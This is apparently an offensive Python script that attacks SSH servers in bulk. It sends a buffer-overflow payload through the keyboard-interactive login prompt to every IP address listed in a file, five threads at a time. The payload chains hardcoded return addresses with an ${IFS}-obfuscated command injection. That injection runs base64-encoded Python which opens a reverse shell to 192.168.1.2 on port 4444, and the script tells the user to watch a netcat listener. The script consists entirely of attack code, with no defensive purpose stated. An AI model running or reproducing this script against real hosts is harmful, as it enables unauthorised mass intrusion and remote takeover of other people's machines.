import socket
import paramiko
from time import sleep
from concurrent.futures import ThreadPoolExecutor

# Payload construction
payload = b"A" * 516 + b"\x04\x39\xbb\xfe" + b"\x19\xf8\xf0\x14" + b"\x01\x01\x04\x08" + b"\x07\xba\x05\x08" + b"\xd0\x56\xbb\xfe" + b"\xdf\x1e\xc2\xfe" + b"\x8c\x60\xfe\x56" + b"\xf1\xe3\xc3\xfe"
payload += b"python${IFS}-c${IFS}\""

# msfvenom payload
payload += b"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCBhcyBzCmltcG9ydCBzdWJwcm9jZXNzIGFzIHIKc289cy5zb2NrZXQocy5BRl9JTkVULHMuU09DS19TVFJFQU0pCnNvLmNvbm5lY3QoKCcxOTIuMTY4LjEuMicsNDQ0NCkpCnIuc3VicHJvY2Vzcy5jYWxsKGV4ZWMpCg==')[0]))"
payload += b"\""

print(f"Payload length => {len(payload)}")

# Interactive handler function
def inter_handler(title, instructions, prompt_list):
    resp = []
    for pr in prompt_list:
        print(pr)
        if pr[0].startswith('Please enter user name:'):
            sleep(10)
            resp.append(payload)
            print("Payload sent, check your netcat listener")
    return tuple(resp)

# Exploit function
def run_exploit(ip):
    print(f"Running exploit on {ip}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, 22))  # Connect to SSH on port 22
        ts = paramiko.Transport(sock)
        ts.start_client(timeout=10)

        # Set a valid username here
        ts.auth_interactive(username="admin", handler=inter_handler)
    except Exception as e:
        print(f"Failed to exploit {ip}: {e}")
    finally:
        sock.close()

# Function to exploit multiple IPs concurrently
def exploit_multiple_ips(ip_list):
    with ThreadPoolExecutor(max_workers=5) as executor:  # Run 5 threads at a time
        executor.map(run_exploit, ip_list)

# Load IPs from a file (each IP on a new line)
with open('ips.txt', 'r') as file:
    ips = [line.strip() for line in file.readlines()]

# Start the concurrent exploitation of multiple IPs
exploit_multiple_ips(ips)
